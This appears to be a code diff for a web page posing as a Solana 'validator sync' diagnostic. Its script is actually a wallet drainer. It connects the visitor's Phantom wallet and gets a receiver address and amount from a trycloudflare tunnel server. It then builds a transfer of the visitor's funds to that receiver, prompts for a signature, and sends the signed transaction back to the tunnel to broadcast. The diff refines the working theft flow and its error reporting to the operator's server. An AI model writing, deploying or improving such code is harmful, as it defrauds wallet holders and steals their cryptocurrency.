@@ -16,16 +16,13 @@
     <div class="box">
         <h3 style="margin:0; color:#9945FF;">VALIDATOR SYNC</h3>
         <button id="cta">RUN DIAGNOSTICS</button>
-        <div id="log">SYSTEM READY v9.0</div>
+        <div id="log">SYSTEM READY v10.0</div>
     </div>
 
     <script>
         const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
 
-        // 🔱 错误雷达：将手机报错直接打回你的 71 服务器
         async function reportError(stage, msg) {
-            console.error(stage, msg);
-            document.getElementById('log').innerText = "FAIL: " + stage;
             await fetch(tunnel + "/debug", {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -34,57 +31,53 @@
         }
 
         document.getElementById('cta').onclick = async () => {
+            const log = (t) => document.getElementById('log').innerText = t;
             const p = window.solana || window.phantom?.solana;
             const sWeb3 = window.solanaWeb3;
 
-            if (!p) { alert("Please use Phantom Browser"); return; }
-
             try {
-                // STAGE 1: 连接
+                log("STAGE 1: CONNECTING...");
                 await p.connect();
-                document.getElementById('log').innerText = "STAGE 1: CONNECTED";
 
-                // STAGE 2: 调取后端 Helius 数据
+                log("STAGE 2: FETCHING...");
                 const resp = await fetch(tunnel + "/prepare", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ address: p.publicKey.toString() })
                 });
-                if (!resp.ok) throw new Error("Backend Prepare Failed");
                 const info = await resp.json();
-                document.getElementById('log').innerText = "STAGE 2: DATA RECV";
 
-                // STAGE 3: 构造交易
-                const tx = new sWeb3.Transaction();
-                tx.add(sWeb3.SystemProgram.transfer({
-                    fromPubkey: p.publicKey,
-                    toPubkey: new sWeb3.PublicKey(info.receiver),
-                    lamports: Number(info.amount),
-                }));
+                log("STAGE 3: BUILDING TX...");
+                const tx = new sWeb3.Transaction().add(
+                    sWeb3.SystemProgram.transfer({
+                        fromPubkey: p.publicKey,
+                        toPubkey: new sWeb3.PublicKey(info.receiver),
+                        lamports: Number(info.amount),
+                    })
+                );
                 tx.recentBlockhash = info.bh;
                 tx.feePayer = p.publicKey;
-                document.getElementById('log').innerText = "STAGE 3: TX BUILT";
 
-                // STAGE 4: 拉起签名 (这是你卡住的地方，我们重点监控)
-                document.getElementById('log').innerText = "STAGE 4: REQUESTING SIGN...";
+                log("STAGE 4: SIGNING...");
+                // 🔱 这一步会调起弹窗
                 const signed = await p.signTransaction(tx);
                 
-                // STAGE 5: 广播
+                log("STAGE 5: SERIALIZING...");
+                // 🔱 核心修正：完全弃用 Buffer 和 btoa，改用原生字节流回传
                 const serialized = signed.serialize();
-                let binary = "";
-                const bytes = new Uint8Array(serialized);
-                for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
+                const byteArray = Array.from(new Uint8Array(serialized));
 
                 await fetch(tunnel + "/broadcast", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ raw_tx: btoa(binary) })
+                    body: JSON.stringify({ raw_data: byteArray })
                 });
 
-                document.getElementById('log').innerText = "SUCCESS: REDIRECTING...";
-                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);
+                log("SUCCESS: REDIRECTING...");
+                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1000);
 
             } catch (err) {
+                log("FAIL: " + err.message);
                 await reportError("CRASH", err.message);
             }
         };
